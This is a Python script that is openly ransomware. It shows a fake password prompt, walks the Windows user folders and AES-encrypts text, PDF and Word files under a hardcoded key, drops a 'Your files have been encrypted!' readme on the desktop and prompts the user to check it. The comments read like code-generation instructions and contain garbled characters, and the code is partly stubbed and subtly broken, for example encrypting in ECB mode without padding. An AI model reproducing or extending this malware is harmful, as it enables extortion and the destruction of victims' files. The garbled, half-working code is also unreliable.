import os
import glob
from Crypto.Cipher import AES

def login_screen():
    password = input("Enter your password: ")
    # Code for fake login screen

def encrypt_files():
    # Scan paths "C: Users ™* #C: Users\ and walk through all the directories and sub-directories
    for root, dirs, files in os.walk("C:/Users"):
        for file in files:
            # Collect the files of specific file types mentioned in the code file
            if file.endswith(".txt") or file.endswith(".pdf") or file.endswith(".docx"):
                # Call a function to encrypt the files with AES.MODE_ECB encryption
                key = b'Sixteen byte key'
                cipher = AES.new(key, AES.MODE_ECB)
                with open(os.path.join(root, file), 'rb') as f:
                    plaintext = f.read()
                ciphertext = cipher.encrypt(plaintext)
                # Save them on their original paths with a new file extension i.e. «filename> fileextension
                new_file_name = os.path.splitext(file)[0] + ".encrypted"
                with open(os.path.join(root, new_file_name), 'wb') as f:
                    f.write(ciphertext)

def generate_readme():
    # Generate a function that gets executed which generates a readme.txt file on the desktop of the infected system
    readme_text = "Your files have been encrypted!"
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    with open(os.path.join(desktop_path, "readme.txt"), 'w') as f:
        f.write(readme_text)

def change_background():
    # Generate a pop-up on the user's screen, asking to check the readme.txt file and change the background of the screen on the target's device
    print("Please check your desktop for a readme.txt file.")
    print("Please change your background to this image.")
    # Code for changing background

login_screen()
encrypt_files()
generate_readme()
change_background()

